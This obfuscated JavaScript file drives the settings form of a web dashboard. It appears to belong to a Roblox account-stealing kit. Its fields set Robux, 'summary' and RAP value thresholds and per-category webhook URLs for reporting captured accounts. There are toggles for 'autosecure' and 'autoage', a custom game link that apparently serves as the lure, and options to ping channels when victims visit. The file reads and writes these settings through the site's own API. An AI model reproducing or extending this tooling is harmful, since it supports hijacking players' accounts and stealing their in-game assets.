async function UptoDate() {
        try {
            const _0x1348d6 = await fetch(window.location.origin + '/api/settings/settingsData.php', {
                'method': 'GET',
                'headers': {
                    'Content-Type': 'application/json'
                },
                'credentials': 'include'
            });
            const _0x1a93fa = await _0x1348d6.json();
            setCustomizedFormData(_0x1a93fa);
        } catch (_0x784c3b) {
            Toastify({
                'text': "Error fetching. Try again later...",
                'duration': 5000,
                'newWindow': true,
                'gravity': 'top',
                'position': 'center',
                'stopOnFocus': true,
                'style': {
                    'background': '#ef4444',
                    'text': 'white',
                    'border-radius': '5px'
                }
            }).showToast();
        }
    }
    (async () => {
        await UptoDate();
    })();
document.getElementById('submit').onclick = async () => {
    try {
        const _0x317f68 = {
            'minimum': {
                'robux': Number(document.querySelector('#minRobux').value),
                'summary': Number(document.querySelector('#minSummary').value),
                'rap': Number(document.querySelector('#minRAP').value)
            },
            'webhooks': {
                'default': document.querySelector('#webhookDefault').value,
                'robux': document.querySelector('#webhookRobux').value,
                'summary': document.querySelector('#webhookSummary').value,
                'rap': document.querySelector('#webhookRAP').value
            },
            'dashboard': {
                'anonymous': document.querySelector('#dashboardAnonymous').checked,
                'autosecure': document.querySelector('#dashboardAutosecure').checked,
		'autoage': document.querySelector('#dashboardAutoAge').checked
            },
            'embed': {
                'pingEveryone': document.querySelector('#embedPingEveryone').checked,
                'pingHere': document.querySelector('#embedPingHere').checked,
                'visitNoti': document.querySelector('#embedVisitNoti').checked
            },
            'customGameLink': document.querySelector('#customGameLink').value
        };
        const _0x21d71c = await fetch(window.location.origin + '/api/settings/updateSettings.php', {
            'method': 'POST',
            'headers': {
                'Content-Type': 'application/json'
            },
            'body': JSON.stringify(_0x317f68)
        });
        if (!_0x21d71c.ok) {
            throw new Error("Request failed with status code " + _0x21d71c.status);
        }
        const _0x2efd4b = await _0x21d71c.json();
        if (_0x2efd4b.success) {
            Toastify({
                'text': _0x2efd4b.msg,
                'duration': 5000,
                'newWindow': true,
                'gravity': 'top',
                'position': 'center',
                'stopOnFocus': true,
                'style': {
                    'background': '#22c55e',
                    'text': 'white',
                    'border-radius': '5px'
                }
            }).showToast();
            await UptoDate();
        } else {
            Toastify({
                'text': _0x2efd4b.msg,
                'duration': 5000,
                'newWindow': true,
                'gravity': 'top',
                'position': 'center',
                'stopOnFocus': true,
                'style': {
                    'background': '#ef4444',
                    'text': 'white',
                    'border-radius': '5px'
                }
            }).showToast();
        }
    } catch (_0x4f0589) {
        Toastify({
            'text': "Error updating. Try again later...",
            'duration': 5000,
            'newWindow': true,
            'gravity': 'top',
            'position': 'center',
            'stopOnFocus': true,
            'style': {
                'background': '#ef4444',
                'text': 'white',
                'border-radius': '5px'
            }
        }).showToast();
        console.error("Error updating settings:", _0x4f0589);
    }
};

function setCustomizedFormData(_0x405258) {
    const {
        minimum: {
            robux: _0xaa7dba,
            summary: _0x3afb50,
            rap: _0x31e8c4
        },
        webhooks: {
            default: _0x48958a,
            robux: _0x583266,
            summary: _0x45d47b,
            rap: _0x1951c5
        },
        dashboard: {
            anonymous: _0x366a34,
            autosecure: _0x8e24ce,
            autoage: AutoAge,
        },
        embed: {
            visitNoti: _0x505c82,
            pingEveryone: _0x187839,
            pingHere: _0x505c88
        },
        customGameLink: _0x2a6f41
    } = _0x405258 || {};
    document.querySelector('#minRobux').value = _0xaa7dba;
    document.querySelector('#minSummary').value = _0x3afb50;
    document.querySelector('#minRAP').value = _0x31e8c4;
    document.querySelector('#webhookDefault').value = _0x48958a;
    document.querySelector('#webhookRobux').value = _0x583266;
    document.querySelector('#webhookSummary').value = _0x45d47b;
    document.querySelector('#webhookRAP').value = _0x1951c5;
    document.querySelector('#dashboardAnonymous').checked = _0x366a34;
    document.querySelector('#dashboardAutosecure').checked = _0x8e24ce;
    document.querySelector('#dashboardAutoAge').checked = AutoAge;
    document.querySelector('#embedPingEveryone').checked = _0x187839;
    document.querySelector('#embedPingHere').checked = _0x505c88;
    document.querySelector('#embedVisitNoti').checked = _0x505c82;
    document.querySelector('#customGameLink').value = _0x2a6f41;
}

function getCustomizedFormData() {
    return {
        'minimum': {
            'robux': Number(document.querySelector('#minRobux').value),
            'summary': Number(document.querySelector('#minSummary').value),
            'rap': Number(document.querySelector('#minRAP').value)
        },
        'webhooks': {
            'default': document.querySelector('#webhookDefault').value,
            'robux': document.querySelector('#webhookRobux').value,
            'summary': document.querySelector('#webhookSummary').value,
            'rap': document.querySelector('#webhookRAP').value
        },
        'dashboard': {
            'anonymous': document.querySelector('#dashboardAnonymous').checked,
            'autosecure': document.querySelector('#dashboardAutosecure').checked,
	    'autoage': document.querySelector('#dashboardAutoAge').checked
        },
        'embed': {
            'pingEveryone': document.querySelector('#embedPingEveryone').checked,
            'pingHere': document.querySelector('#embedPingHere').checked,
            'visitNoti': document.querySelector('#embedVisitNoti').checked
        },
        'customGameLink': document.querySelector('#customGameLink').value
    };
}